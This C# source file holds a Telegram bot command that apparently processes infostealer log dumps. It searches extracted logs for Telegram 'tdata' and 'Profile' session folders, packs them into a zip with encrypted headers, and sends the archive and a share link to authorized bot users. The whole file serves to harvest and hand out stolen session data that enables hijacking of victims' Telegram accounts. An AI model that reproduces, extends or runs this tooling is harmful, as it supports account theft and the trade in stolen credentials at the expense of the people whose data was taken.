using System.Text;
using SevenZip;
using TelegramBot.Extensions;
using TelegramBot.Models;
using TelegramBot.Services;
using TL;
using WTelegram;

namespace TelegramBot.Commands.Services;

public class TelegramServiceCommand(Client client, DataService data, Random random) : ICommand, ICallbackCommand
{
    public bool AuthorizedOnly { get; } = true;

    public Task Invoke(UpdateNewMessage update, User user) => client.SendMessageAvailableLogs(user, data, random, "Telegram");

    public async Task Invoke(UpdateBotCallbackQuery update, User user)
    {
        if (update.data.Length == 1)
        {
            await client.SendCallbackAvailableLogs(user, data, update.msg_id, update.data);
            
            return;
        }

        var logsname = Encoding.UTF8.GetString(update.data);
        var logspath = data.GetExtractedPath(logsname);
        var zippath = data.CreateZipPath(logsname, name: "Telegram");

        var zip = new SevenZipCompressor
        {
            EventSynchronization = EventSynchronizationStrategy.AlwaysAsynchronous,
            CompressionMode = CompressionMode.Create,
            ArchiveFormat = OutArchiveFormat.Zip,
            CompressionMethod = CompressionMethod.Lzma2,
            EncryptHeaders = true,
            DirectoryStructure = true,
            PreserveDirectoryRoot = true
        };

        var logs = Directory.GetDirectories(logspath);
        var index = 0;
        var created = false;

        foreach (var log in logs)
        {
            var telegrampath = Directory.GetDirectories(log, "Telegram", SearchOption.AllDirectories).FirstOrDefault();

            if (telegrampath is null) continue;

            foreach (var tdata in Directory.GetDirectories(telegrampath)
                         .Where(x =>
                         {
                             var name = x[(x.LastIndexOf('\\') + 1)..];
                             return name.StartsWith("Profile") || name.StartsWith("tdata");
                         }))
            {
                if (created) zip.CompressionMode = CompressionMode.Append;
                
                int namestart = tdata.LastIndexOf('\\'), nameendindex = tdata[namestart..].IndexOf(' ');
                var newdir = tdata[..(namestart + (nameendindex == -1 ? tdata.Length - namestart : nameendindex))] + $" ({index})";
                
                if (!Directory.Exists(newdir)) Directory.Move(tdata, newdir);

                index++;

                await zip.CompressDirectoryAsync(newdir, zippath);
                created = true;
            }
        }

        if (!File.Exists(zippath))
        {
            await client.Messages_SendMessage(user, $"Telegram in {logsname} not found", random.NextInt64());
            
            return;
        }

        await data.SendFileAsync(user, zippath, await data.GetShareLinkAsync(zippath));
    }
}